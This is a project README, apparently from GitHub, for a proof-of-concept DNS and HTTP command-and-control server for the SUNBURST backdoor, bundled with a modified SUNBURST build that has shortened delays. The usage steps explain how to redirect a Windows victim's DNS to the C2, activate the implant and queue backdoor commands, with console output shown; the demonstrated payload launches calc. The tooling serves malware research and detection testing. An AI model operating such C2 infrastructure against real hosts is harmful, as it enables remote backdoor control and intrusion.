<!--
*** Thanks for checking out the Best-README-Template. If you have a suggestion
*** that would make this better, please fork the repo and create a pull request
*** or simply open an issue with the tag "enhancement".
*** Thanks again! Now go create something AMAZING! :D
***
***
***
*** To avoid retyping too much info. Do a search and replace for the following:
*** CreatePhotonW, SunburstC2Server, @CreatePhotonW, email, SunburstC2Server, PoC Sunburst DNS and HTTP C2 server
-->



<!-- PROJECT SHIELDS -->
<!--
*** I'm using markdown "reference style" links for readability.
*** Reference links are enclosed in brackets [ ] instead of parentheses ( ).
*** See the bottom of this document for the declaration of the reference variables
*** for contributors-url, forks-url, etc. This is an optional, concise syntax you may use.
*** https://www.markdownguide.org/basic-syntax/#reference-style-links
-->
<!--
[![Contributors][contributors-shield]][contributors-url]
[![Forks][forks-shield]][forks-url]
[![Stargazers][stars-shield]][stars-url]
[![Issues][issues-shield]][issues-url]
[![MIT License][license-shield]][license-url]
[![LinkedIn][linkedin-shield]][linkedin-url]
-->


<!-- PROJECT LOGO -->
<br />
<p align="center">
  <a href="https://github.com/CreatePhotonW/SunburstC2Server">
<!--    <img src="images/logo.png" alt="Logo" width="80" height="80"> -->
  </a>

  <h3 align="center">SunburstC2Server</h3>

  <p align="center">
    PoC Sunburst DNS and HTTP C2 server
    <br />
<!--    <a href="https://github.com/CreatePhotonW/SunburstC2Server"><strong>Explore the docs »</strong></a> -->
    <br />
    <br />
    <!--
    <a href="https://github.com/CreatePhotonW/SunburstC2Server">View Demo</a>
    ·
    -->
    <a href="https://github.com/CreatePhotonW/SunburstC2Server/issues">Report Bug</a>
    ·
    <a href="https://github.com/CreatePhotonW/SunburstC2Server/issues">Request Feature</a>
  </p>
</p>



<!-- TABLE OF CONTENTS -->
<details open="open">
  <summary><h2 style="display: inline-block">Table of Contents</h2></summary>
  <ol>
    <li>
      <a href="#about-the-project">About The Project</a>
    </li>
    <li>
      <a href="#getting-started">Getting Started</a>
      <ul>
        <li><a href="#prerequisites">Prerequisites</a></li>
        <li><a href="#installation">Installation</a></li>
      </ul>
    </li>
    <li><a href="#usage">Usage</a></li>
    <li><a href="#roadmap">Roadmap</a></li>
    <li><a href="#contributing">Contributing</a></li>
    <li><a href="#license">License</a></li>
    <li><a href="#contact">Contact</a></li>
  </ol>
</details>



<!-- ABOUT THE PROJECT -->
## About The Project

<!--
[![Product Name Screen Shot][product-screenshot]](https://example.com)
-->

SunburstC2Server is a proof of concept DNS and HTTP C2 servers for the SUNBURST malware based public technical writeups and sample reversing. With this, it is possible to utilize SUNBURST to run backdoor commands.

Also included is a version of SUNBURST that is convenient for testing this C2 implementation. Delays are drastically shortened and anti-analysis checks are not performed.
This C2 server would work with the unmodified sample, but waiting days to execute calc is no fun :)

<!-- 
### Built With

* []()
* []()
* []()

-->



<!-- GETTING STARTED -->
## Getting Started

To get a local copy up and running follow these simple steps.

### Prerequisites

* python3

* python packages

    ```
    sudo pip install -r requirements_dns.txt
    sudo pip install -r requirements_http.txt
    ```

### Installation

1. Clone the repo
   ```sh
   git clone https://github.com/CreatePhotonW/SunburstC2Server.git
   ```

<!-- USAGE EXAMPLES -->
## Usage

1. On a server (local or remote) run:
```
python3 sunburst_httpc2.py
```
2. In the HTTP C2 shell, type `auto_execute 5 calc` and hit enter
3. On a server (local or remote) run (replace `127.0.0.1` with the IP address of the HTTP C2 server):
```
python3 sunburst_dnsc2.py --httpc2ip 127.0.0.1
```
4. In the DNS C2 shell, type `auto_activate` and hit enter
5. Change your Windows victim's DNS server to point to the IP address of the DNS C2 server
6. Build the Visual Studio solution
7. Run SolarWinds.BusinessLayerHost.exe
8. Wait 30-60 seconds
9. SolarWinds.BusinessLayerHost.exe will reach out to the DNS C2 server and progress through the Activation phase
```
                    ___                          __        ___                    ________  
  ________ __  ____ \_ |__  __ _________  ______/  |_   __| _/ ____   ______ ____ \_____  \ 
 /  ___/  |  \/    \ | __ \|  |  \_  __ \/  ___/   __\ / __ | /    \ /  ___// ___\ /  ____/ 
 \___ \|  |  /   |  \| \_\ \  |  /|  | \/\___ \ |  |  / /_/ ||   |  \\___ \\  \___/       \ 
/____  \____/|___|  /|___  /____/ |__|  /____  \|__|  \____ ||___|  /____  \\___  /_______ \
     \/           \/     \/                  \/            \/     \/     \/     \/        \/
    
Welcome to the Sunburst DNS C2 Coordinator.
Type help or ? to list commands.

(sunburst) auto_activate
	Sunbeams will begin activation when they first connect
(sunburst) (01:08:27) [*] New sunbeam found: b'4f4774e0740a7e72'
(01:08:27) [*] sunbeam preactivated (activation step 1/2): b'4f4774e0740a7e72'
(01:08:37) [*] sunbeam activated (activation step 2/2): b'4f4774e0740a7e72'
```
10. SolarWinds.BusinessLayerHost.exe will reach out to the HTTP C2 server and fetch its first backdoor command.
```
                    ___                          __    /\      __    __                ________  
  ________ __  ____ \_ |__  __ _________  ______/  |_ |  |__ _/  |__/  |_______   ____ \_____  \ 
 /  ___/  |  \/    \ | __ \|  |  \_  __ \/  ___/   __\|  |  \\   __\   __\____ \_/ ___\ /  ____/ 
 \___ \|  |  /   |  \| \_\ \  |  /|  | \/\___ \ |  |  |      \|  |  |  | |  |_\ \  \___/       \ 
/____  \____/|___|  /|___  /____/ |__|  /____  \|__|  |___|  /|__|  |__| |   ___/\___  /_______ \
     \/           \/     \/                  \/            \/            |__|        \/        \/
    
Welcome to the Sunburst HTTP C2 Server.
Type help or ? to list commands.

(sunburst) auto_execute 5 calc
	Sunbeam will process the next auto execute job in the queue on its next HTTP response
(sunburst) (01:08:39) [*] New sunbeam found: b'4f4774e0740a7e72'
```
11. SolarWinds.BusinessLayerHost.exe will run a RunTask job (id=5) to spawn calc


<!-- ROADMAP -->
## Roadmap

See the [open issues](https://github.com/CreatePhotonW/SunburstC2Server/issues) for a list of proposed features (and known issues).



<!-- CONTRIBUTING -->
## Contributing

Contributions are what make the open source community such an amazing place to be learn, inspire, and create. Any contributions you make are **greatly appreciated**.

1. Fork the Project
2. Create your Feature Branch (`git checkout -b feature/AmazingFeature`)
3. Commit your Changes (`git commit -m 'Add some AmazingFeature'`)
4. Push to the Branch (`git push origin feature/AmazingFeature`)
5. Open a Pull Request



<!-- LICENSE -->
## License

Distributed under the MIT License. See `LICENSE` for more information.



<!-- CONTACT -->
## Contact

CreatePhotonW - [@CreatePhotonW](https://twitter.com/CreatePhotonW)

Project Link: [https://github.com/CreatePhotonW/SunburstC2Server](https://github.com/CreatePhotonW/SunburstC2Server)



<!-- MARKDOWN LINKS & IMAGES -->
<!-- https://www.markdownguide.org/basic-syntax/#reference-style-links -->
[contributors-shield]: https://img.shields.io/github/contributors/CreatePhotonW/repo.svg?style=for-the-badge
[contributors-url]: https://github.com/CreatePhotonW/repo/graphs/contributors
[forks-shield]: https://img.shields.io/github/forks/CreatePhotonW/repo.svg?style=for-the-badge
[forks-url]: https://github.com/CreatePhotonW/repo/network/members
[stars-shield]: https://img.shields.io/github/stars/CreatePhotonW/repo.svg?style=for-the-badge
[stars-url]: https://github.com/CreatePhotonW/repo/stargazers
[issues-shield]: https://img.shields.io/github/issues/CreatePhotonW/repo.svg?style=for-the-badge
[issues-url]: https://github.com/CreatePhotonW/repo/issues
[license-shield]: https://img.shields.io/github/license/CreatePhotonW/repo.svg?style=for-the-badge
[license-url]: https://github.com/CreatePhotonW/repo/blob/master/LICENSE.txt
[linkedin-shield]: https://img.shields.io/badge/-LinkedIn-black.svg?style=for-the-badge&logo=linkedin&colorB=555
[linkedin-url]: https://linkedin.com/in/CreatePhotonW
